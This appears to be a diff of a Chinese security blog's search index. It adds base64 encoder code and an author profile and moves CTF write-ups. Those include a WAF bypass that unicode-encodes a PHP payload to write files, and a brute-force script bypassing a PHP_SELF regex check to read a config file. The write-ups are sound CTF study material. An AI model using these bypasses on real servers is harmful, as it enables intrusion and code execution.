+                &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,
+                &#39;+&#39;, &#39;/&#39;, &#39;=&#39;]
+def num_10_to_2(numbers):
+    result=[]
+    tmp=[]
+    return_str=&#39;&#39;
+    for number in numbers:
+        while number/2!=0:
+            result.append(int(number%2))
+            number=int(number/2)    
+        if(len(result)&lt;8):
+            for i in range(0,8-len(result)):
+                result.append(0)
+        number_2=&#39;&#39;
+        for i in range(0,len(result)):    
+            nums=len(result)-i-1
+            number_2=str(result[nums])+number_2
+        tmp.append(number_2)
+        result=[]
+    for i in range(len(tmp)):
+        return_str=return_str+tmp[i][::-1]
+    return return_str
+def num_2_to_10(number):
+    number=str(number)
+    nums=0
+    for i  in number:
+        nums=nums*2+int(i)
+    return nums            
+
+def str_to_aiisc(str_char):
+    tmp=[]
+    for i in str_char:
+         tmp.append(int(ord(i)))    
+    return tmp
+def cut_string(strings,lenth):
+    result =  re.findall(&#39;.{&#39;+str(lenth)+&#39;}&#39;,strings)
+    result.append(strings[(len(result)*lenth):]) #把最后几位加上
+    for i in range(0,6-len(result[len(result)-1])):
+        result[len(result)-1]=result[len(result)-1]+str(&#39;0&#39;)
+    return result
+def main(strings):
+    group_base = cut_string(num_10_to_2(str_to_aiisc(strings)),6)
+    if(group_base[len(group_base)-1])==&#39;000000&#39;:
+        group_base.pop(len(group_base)-1)
+    #print(group_base)
+    for i in group_base:
+        print(base64_table[num_2_to_10(i)], end=&#39;&#39;)
+    #print(4-int((len(group_base)/4)/0.25)%4)    
+    for i in range(4-int((len(group_base)/4)/0.25)%4):
+        print(&quot;=&quot;, end=&#39;&#39;)
+    print(&#39;\n&#39;)    
+if __name__==&#39;__main__&#39;:
+    main(&#39;A&#39;)</code></pre>
+<h2 id="PHP实现BASE64编码"><a href="#PHP实现BASE64编码" class="headerlink" title="PHP实现BASE64编码"></a>PHP实现BASE64编码</h2><pre><code class="php">&lt;?php
+function num_10_to_2($number){
+    $result=[];
+    $tmp=[];
+    $number_2=&#39;&#39;;
+    for($i=0;$i&lt;count($number);$i++){
+        while ($number[$i]/2!=0) {
+        array_push($result,intval($number[$i]%2));
+        $number[$i]=intval($number[$i]/2);
+        }
+        for($j=0;$j&lt;count($result);$j++){
+            $nums = count($result)-$j-1;
+            $number_2 = strval($result[$nums]).$number_2;
+        }
+        ///echo $number_2.&#39;&lt;br&gt;&#39;;
+        array_push($tmp,$number_2);
+        $number_2=&#39;&#39;;
+        $result=[];
+    }
+    //var_dump($tmp);
+    for($j=0;$j&lt;count($tmp);$j++){
+    if(strlen($tmp[$j])&lt;8){
+        for($i=0;$i&lt;8-strlen($tmp[$j]);$i++){
+            $tmp[$j]=$tmp[$j].&#39;0&#39;;
+        }
+        $tmp[$j]=strrev($tmp[$j]);
+        //echo $tmp[$j].&#39;&lt;br&gt;&#39;;
+    }
+    }
+
+```
+return implode($tmp);
+```
+
+}
+function num_2_to_10($number){
+    $number = strval($number);
+    $nums = 0;
+    for($i=0;$i&lt;strlen($number);$i++){
+        $nums = $nums*2+intval(substr($number,$i,1));
+    }
+    return $nums;
+}
+function str_to_aiisc($str_char){
+    $result=[];
+    $str_char = strval($str_char);
+    for($i=0;$i&lt;strlen($str_char);$i++){
+        array_push($result,intval(ord(substr($str_char,$i,1))));
+    }
+    return $result;
+}
+function cut_string($number,$lenth){
+    $number = strval($number);
+    $number =  str_split($number,intval($lenth));
+    for($i=0;$i&lt;count($number);$i++){
+        if(strlen($number[$i])&lt;6){
+            $number[$i]=$number[$i].str_repeat(&#39;0&#39;, 6-strlen($number[$i]));
+        }
+    }
+    return $number;
+}
+function base64Encode($strings){
+    $base64_table = [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,
+                &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,
+                &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,
+                &#39;+&#39;, &#39;/&#39;, &#39;=&#39;];
+    $result=&#39;&#39;;
+    $group_bas64 = cut_string(num_10_to_2(str_to_aiisc($strings)),6);
+    for($i=0;$i&lt;count($group_bas64);$i++){
+        $result=$result.$base64_table[num_2_to_10($group_bas64[$i])];
+    }
+    for($i=0;$i&lt;4-intval((count($group_bas64)/4)/0.25)%4;$i++){
+        $result=$result.&quot;=&quot;;
+    }
+    return $result;
+}
+ echo base64Encode(&#39;ABaaa&#39;)
+?&gt;</code></pre>
 ]]></content>
       <categories>
-        <category>AboutMe</category>
+        <category>编码学习</category>
       </categories>
       <tags>
-        <tag>自我介绍</tag>
+        <tag>学习笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -1658,6 +2015,23 @@ python get-pip.py</code></pre>
       </categories>
       <tags>
         <tag>IoT</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于我</title>
+    <url>//articles/d3a8da2734.html</url>
+    <content><![CDATA[<p>ID:Gq/xiaoleung</p>
+<p>乌云ID:土豪</p>
+<p>一名CS大学生退役士兵，主要学习web安全的小菜鸡。</p>
+<p>热爱摄影，热爱户外，热爱编程和网络安全。</p>
+<p>Email:admin#plasf.cn</p>
+<p>WeChat:Q1BMQVhERg==</p>
+]]></content>
+      <categories>
+        <category>AboutMe</category>
+      </categories>
+      <tags>
+        <tag>自我介绍</tag>
       </tags>
   </entry>
   <entry>
@@ -2045,150 +2419,6 @@ $phar-&gt;stopBuffering();</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>西湖论剑Easyjson Write up</title>
-    <url>//articles/2a808de4a49b19.html</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<p>太菜了只做了一道</p>
-</blockquote>
-<h2 id="Easyjson"><a href="#Easyjson" class="headerlink" title="Easyjson"></a>Easyjson</h2><ul>
-<li>代码审计</li>
-</ul>
-<pre><code class="php"> &lt;?php
-include &#39;security.php&#39;;
-
-if(!isset($_GET[&#39;source&#39;])){
-    show_source(__FILE__);
-    die();
-}
-$sandbox = &#39;sandbox/&#39;.sha1($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]).&#39;/&#39;;
-var_dump($sandbox);
-if(!file_exists($sandbox)){
-    mkdir($sandbox);
-    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;);
-}
-$action = $_GET[&#39;action&#39;];
-$content = file_get_contents(&quot;php://input&quot;);
-
-
-if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
-    $content = json_decode($content);
-    $filename = $_GET[&#39;filename&#39;];
-    $filecontent = $content-&gt;content;
-    $filename = $sandbox.$filename;
-    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
-}elseif($action == &quot;reset&quot;){
-    $files = scandir($sandbox);
-    foreach($files as $file) {
-        if(!is_dir($file)){
-            if($file !== &quot;index.php&quot;){
-                unlink($sandbox.$file);
-            }
-        }
-    }
-}
-else{
-    die(&#39;Security Check Failed.&#39;);
-}
-</code></pre>
-<ul>
-<li>代码主要部分在,但是这里有一个waf对文件名和content参数进行过滤。简单Fuzz了一下，filename可以使用php后缀，说明可以写php文件，但是有一个很关键的问题就是<code>content</code>它传来必须是一个json,json中有一个属性是content，例如：<code>{&#39;content&#39;:&#39;&lt;?=phpinfo()?&gt;&#39;}</code>但是<code>waf</code>对json进行了过滤，不能存在content这个字符串(还过滤了其他关键字)。</li>
-</ul>
-<pre><code class="php">if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
-    $content = json_decode($content);
-    $filename = $_GET[&#39;filename&#39;];
-    $filecontent = $content-&gt;content;
-    $filename = $sandbox.$filename;
-    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
-}</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001234@2x.png" alt="WX20201009-001234@2x"></p>
-<ul>
-<li>神小密圈发现，json支持的字符中可以支持unicode编码，那么我们全都用unicode编码来代替字符串不就行了？</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG59.jpeg" alt="WechatIMG59"></p>
-<ul>
-<li>简单测试一下发现可以.<a href="https://blog.csdn.net/weixin_30654419/article/details/97554779?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param" target="_blank" rel="noopener">Unicode表</a></li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG72.png" alt="WechatIMG72"></p>
-<ul>
-<li>简单写个脚本来将字符串转化为unicode编码。</li>
-</ul>
-<pre><code class="php">&lt;?php
-
-function unicode_encode($str){
-    $table = [
-            &#39;\u002&#39;=&gt;[&#39; &#39;,&#39;!&#39;,&#39;&quot;&#39;,&#39;#&#39;,&#39;$&#39;,&#39;%&#39;,&#39;&amp;&#39;,&#39;\&#39;&#39;,&#39;(&#39;,&#39;)&#39;,&#39;*&#39;,&#39;+&#39;,&#39;,&#39;,&#39;-&#39;,&#39;.&#39;,&#39;/&#39;],
-            &#39;\u003&#39;=&gt;[&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;:&#39;,&#39;;&#39;,&#39;&lt;&#39;,&#39;=&#39;,&#39;&gt;&#39;,&#39;?&#39;],
-            &#39;\u004&#39;=&gt;[&#39;@&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;],
-            &#39;\u005&#39;=&gt;[&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;[&#39;,&#39;\\&#39;,&#39;]&#39;,&#39;^&#39;,&#39;_&#39;],
-            &#39;\u006&#39;=&gt;[&#39;`&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;],
-            &#39;\u007&#39;=&gt;[&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;{&#39;,&#39;|&#39;,&#39;}&#39;,&#39;~&#39;]
-];
-    foreach ($table as $key =&gt; $value) {
-        $i = 0;
-        foreach ($value as $vcode) {
-            $i=$i+1;
-            if($str==$vcode){
-                return $key.bin2e($i-1);
-            }
-
-        }
-    }
-
-}
-
-function bin2e($str){
-    switch ($str) {
-        case &#39;10&#39;:
-            return &#39;a&#39;;
-            break;
-        case &#39;11&#39;:
-            return &#39;b&#39;;
-            break;
-        case &#39;12&#39;:
-            return &#39;c&#39;;
-            break;
-        case &#39;13&#39;:
-            return &#39;d&#39;;
-            break;
-        case &#39;14&#39;:
-            return &#39;e&#39;;
-            break;
-        case &#39;15&#39;:
-            return &#39;f&#39;;
-            break;
-        default:
-            return $str;
-            break;
-    }
-}
-
-function main($str){
-for($i=0;$i&lt;strlen($str);$i++){
-    echo unicode_encode($str[$i]);
-}
-}
-
-
-main(&#39;&lt;?=phpinfo()?&gt;&#39;);
-?&gt;</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000458@2x.png" alt="WX20201009-000458@2x"></p>
-<ul>
-<li>EXP</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000600@2x.png" alt="WX20201009-000600@2x"></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000806@2x.png" alt="WX20201009-000806@2x"></p>
-<ul>
-<li>Getflag</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001124@2x.png" alt="WX20201009-001124@2x"></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001031@2x.png" alt></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000938@2x.png" alt="WX20201009-000938@2x"></p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>JavaScript原型链污染学习笔记</title>
     <url>//articles/d3e8844c56.html</url>
     <content><![CDATA[<h2 id="什么是原型链"><a href="#什么是原型链" class="headerlink" title="什么是原型链"></a>什么是原型链</h2><p>​        JavaScript常被称为基于原型的语言，也就是说js中没有类，在继承时候只有一种结构那就是对象（ <strong>object</strong> ）。每个对象都有一个私有属性那就是<code>__proto__</code>,而<code>__proto__</code>又会指向它的构造函数的原型对象（<strong>prototype</strong> ）一直到一个对象的原型对象为 <code>null</code>为止。</p>
@@ -2447,63 +2677,6 @@ else
       </tags>
   </entry>
   <entry>
-    <title>MISC专项训练笔记</title>
-    <url>//articles/d430b53b04.html</url>
-    <content><![CDATA[<h2 id="MRCTF2020-不眠之夜"><a href="#MRCTF2020-不眠之夜" class="headerlink" title="[MRCTF2020]不眠之夜"></a>[MRCTF2020]不眠之夜</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875492048718.png" alt="img"></p>
-<p>一堆乱七八糟的图片。直接用montage合成一张图。</p>
-<pre><code class="shell">montage *.jpg -geometry +0+0+0 ok.jpg</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875497047175.jpg" alt="img"></p>
-<pre><code>gaps --image=ok.jpg --generations=50 --population=120 --size=50</code></pre><p>出来flag</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875505799743.png" alt="img"></p>
-<h2 id="MRCTF2020-你能看懂音符吗"><a href="#MRCTF2020-你能看懂音符吗" class="headerlink" title="[MRCTF2020]你能看懂音符吗"></a>[MRCTF2020]你能看懂音符吗</h2><p>压缩包打开失败…于是猜测文件损坏。用010打开，docx映入眼帘，同时文件头被修改，改回来RAR即可。</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/1587550972340.png" alt="img"></p>
-<p>用word打开显示隐藏文字得到：</p>
-<pre><code>♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=</code></pre><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue" target="_blank" rel="noopener">千千字</a>秀解密得到：</p>
-<pre><code>MRCTF{thEse_n0tes_ArE_am@zing~}</code></pre><h2 id="MRCTF2020-寻找xxx"><a href="#MRCTF2020-寻找xxx" class="headerlink" title="[MRCTF2020]寻找xxx"></a>[MRCTF2020]寻找xxx</h2><p>打开电话拨号声，不用想直接扔<a href="https://github.com/hfeeki/dtmf" target="_blank" rel="noopener">dtmf</a>读取出来，然后手动去重，因为有干扰声。</p>
-<p>18684221609</p>
-<h2 id="MRCTF2020-Hello-misc"><a href="#MRCTF2020-Hello-misc" class="headerlink" title="[MRCTF2020]Hello_ misc"></a>[MRCTF2020]Hello_ misc</h2><p>binwalk分离出来一个加密的压缩包。爆破无果。</p>
-<p>用StegSolve图片中分离出一张图片得到密码：</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875597586078.png" alt="img"></p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875598279919.png" alt="img"></p>
-<p>解压出来是TTL.用脚本转换为字符</p>
-<pre><code class="python">import re
-
-txt = open(&quot;out.txt&quot;,&#39;r&#39;)
-line = txt.readlines()
-number = []
-flag = &quot;&quot;
-for i in line:
-    number.append(int(i))
-for i in number:
-    if(i == 63):
-        flag += &quot;00&quot;
-    elif(i == 127):
-        flag += &quot;01&quot;
-    elif(i == 191):
-        flag += &quot;10&quot;
-    else:
-        flag += &quot;11&quot;
-strr = re.findall(r&#39;.{8}&#39;, flag)
-for i in strr:
-    print(chr(int(i,2)),end=&quot;&quot;)</code></pre>
-<p>得到密码<code>0ac1fe6b77be5dbe</code> 压缩包里面再得到一个word，文字全部变成黑色得到：</p>
-<pre><code>MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx
-MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx
-MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx
-MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx
-MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx
-MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx</code></pre><p>base64隐写，用<a href="https://github.com/jerrita/b64steg" target="_blank" rel="noopener">b64steg</a>解密</p>
-<pre><code>b64steg.py -f stego.txt -s out.txt</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20200422/1587560232982.png" alt="img"></p>
-<h2 id="MRCTF2020-摇滚DJ"><a href="#MRCTF2020-摇滚DJ" class="headerlink" title="[MRCTF2020]摇滚DJ"></a>[MRCTF2020]摇滚DJ</h2><p><a href="https://apktrending.com/apk-android/xdsopl-robot36.html" target="_blank" rel="noopener">Robot36 - SSTV Image Decoder</a> 直接AFSK1200无线电解码。<br><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875614783837.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>CTF比赛</category>
-      </categories>
-      <tags>
-        <tag>WriteUp</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>上传漏洞&amp;文件包含总结</title>
     <url>//articles/d42c963778.html</url>
     <content><![CDATA[<ul>
@@ -2634,6 +2807,63 @@ SetHandler application/x-httpd-php
       </categories>
       <tags>
         <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MISC专项训练笔记</title>
+    <url>//articles/d430b53b04.html</url>
+    <content><![CDATA[<h2 id="MRCTF2020-不眠之夜"><a href="#MRCTF2020-不眠之夜" class="headerlink" title="[MRCTF2020]不眠之夜"></a>[MRCTF2020]不眠之夜</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875492048718.png" alt="img"></p>
+<p>一堆乱七八糟的图片。直接用montage合成一张图。</p>
+<pre><code class="shell">montage *.jpg -geometry +0+0+0 ok.jpg</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875497047175.jpg" alt="img"></p>
+<pre><code>gaps --image=ok.jpg --generations=50 --population=120 --size=50</code></pre><p>出来flag</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875505799743.png" alt="img"></p>
+<h2 id="MRCTF2020-你能看懂音符吗"><a href="#MRCTF2020-你能看懂音符吗" class="headerlink" title="[MRCTF2020]你能看懂音符吗"></a>[MRCTF2020]你能看懂音符吗</h2><p>压缩包打开失败…于是猜测文件损坏。用010打开，docx映入眼帘，同时文件头被修改，改回来RAR即可。</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/1587550972340.png" alt="img"></p>
+<p>用word打开显示隐藏文字得到：</p>
+<pre><code>♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=</code></pre><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue" target="_blank" rel="noopener">千千字</a>秀解密得到：</p>
+<pre><code>MRCTF{thEse_n0tes_ArE_am@zing~}</code></pre><h2 id="MRCTF2020-寻找xxx"><a href="#MRCTF2020-寻找xxx" class="headerlink" title="[MRCTF2020]寻找xxx"></a>[MRCTF2020]寻找xxx</h2><p>打开电话拨号声，不用想直接扔<a href="https://github.com/hfeeki/dtmf" target="_blank" rel="noopener">dtmf</a>读取出来，然后手动去重，因为有干扰声。</p>
+<p>18684221609</p>
+<h2 id="MRCTF2020-Hello-misc"><a href="#MRCTF2020-Hello-misc" class="headerlink" title="[MRCTF2020]Hello_ misc"></a>[MRCTF2020]Hello_ misc</h2><p>binwalk分离出来一个加密的压缩包。爆破无果。</p>
+<p>用StegSolve图片中分离出一张图片得到密码：</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875597586078.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875598279919.png" alt="img"></p>
+<p>解压出来是TTL.用脚本转换为字符</p>
+<pre><code class="python">import re
+
+txt = open(&quot;out.txt&quot;,&#39;r&#39;)
+line = txt.readlines()
+number = []
+flag = &quot;&quot;
+for i in line:
+    number.append(int(i))
+for i in number:
+    if(i == 63):
+        flag += &quot;00&quot;
+    elif(i == 127):
+        flag += &quot;01&quot;
+    elif(i == 191):
+        flag += &quot;10&quot;
+    else:
+        flag += &quot;11&quot;
+strr = re.findall(r&#39;.{8}&#39;, flag)
+for i in strr:
+    print(chr(int(i,2)),end=&quot;&quot;)</code></pre>
+<p>得到密码<code>0ac1fe6b77be5dbe</code> 压缩包里面再得到一个word，文字全部变成黑色得到：</p>
+<pre><code>MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx
+MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx
+MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx
+MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx
+MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx
+MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx</code></pre><p>base64隐写，用<a href="https://github.com/jerrita/b64steg" target="_blank" rel="noopener">b64steg</a>解密</p>
+<pre><code>b64steg.py -f stego.txt -s out.txt</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20200422/1587560232982.png" alt="img"></p>
+<h2 id="MRCTF2020-摇滚DJ"><a href="#MRCTF2020-摇滚DJ" class="headerlink" title="[MRCTF2020]摇滚DJ"></a>[MRCTF2020]摇滚DJ</h2><p><a href="https://apktrending.com/apk-android/xdsopl-robot36.html" target="_blank" rel="noopener">Robot36 - SSTV Image Decoder</a> 直接AFSK1200无线电解码。<br><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875614783837.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>CTF比赛</category>
+      </categories>
+      <tags>
+        <tag>WriteUp</tag>
       </tags>
   </entry>
   <entry>
@@ -2869,57 +3099,6 @@ php_value zend.multibyte 1
 php_value zend.script_encoding &quot;UTF-7&quot;
 # \</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190827/15668987829847.png" alt="img"></p>
 <p>（注意写入content使用url编码后传入）</p>
-]]></content>
-      <categories>
-        <category>CTF比赛</category>
-      </categories>
-      <tags>
-        <tag>WriteUp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Zer0pts2020-Can you guess it?</title>
-    <url>//articles/d4f73bcb62.html</url>
-    <content><![CDATA[<h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><pre><code class="php">&lt;?php
-include &#39;config.php&#39;; // FLAG is defined in config.php
-
-if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) {
-  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);
-}
-
-if (isset($_GET[&#39;source&#39;])) {
-  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
-  exit();
-}
-
-$secret = bin2hex(random_bytes(64));
-if (isset($_POST[&#39;guess&#39;])) {
-  $guess = (string) $_POST[&#39;guess&#39;];
-  if (hash_equals($secret, $guess)) {
-    $message = &#39;Congratulations! The flag is: &#39; . FLAG;
-  } else {
-    $message = &#39;Wrong.&#39;;
-  }
-}
-?&gt;</code></pre>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从源码得知flag在config.php中的一个常量中，要得到flag需要我们post一个值guess和随机生成的要预测和爆破基本没戏。但是可以发现 <code>highlight_file()</code> 里面的变量是可控的。那么我们可以看看<code>basename($_SERVER[&#39;PHP_SELF&#39;])</code> 怎么才能得到我们想要的结果。我们从php.net可以得知：</p>
-<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200520150428.png" alt="微信图片_20200520150428"></p>
-<p><code>$_SERVER[&#39;PHP_SELF&#39;]</code> 能够当前url的路径，而basename能够返回返回路径中文件名部分。</p>
-<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154155.png" alt="微信截图_20200520154155"></p>
-<p>那我们不是可以传入<code>/index.php/config.php?souce</code> ？但是一条正则挡住了我们的去路：</p>
-<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154339.png" alt="微信截图_20200520154339"></p>
-<h2 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h2><p>我们还需要绕过</p>
-<pre><code class="php">preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])</code></pre>
-<p>这种正则其实直接写个脚本去爆破即可，一般都是某个字符能够通过。</p>
-<pre><code class="python">import requests
-
-for i in range(0,255):
-    url=&quot;http://c3bedc5a-4535-41a4-9c5f-9a25eae15489.node3.buuoj.cn/index.php/config.php/%s?source&quot;%(chr(i))
-    r = requests.get(url)
-    if &#39;flag&#39; in r.text:
-        print(r.text)
-</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154931.png" alt="微信截图_20200520154931"></p>
 ]]></content>
       <categories>
         <category>CTF比赛</category>
@@ -4066,202 +4245,48 @@ sh.interactive()
       </tags>
   </entry>
   <entry>
-    <title>上海大学生联赛部分write up</title>
-    <url>//articles/d51d5193e2.html</url>
-    <content><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>​        把010编辑器放进010编辑器直接搜索就是了</p>
-<h2 id="decade"><a href="#decade" class="headerlink" title="decade"></a>decade</h2><ul>
-<li><p>页面源码提示代码在<code>/code</code>并且flag在这个页面</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727051288542.png" alt="img"></p>
-</li>
-<li><p>代码和字节跳动的一道boring-code相似,但是过滤得更多</p>
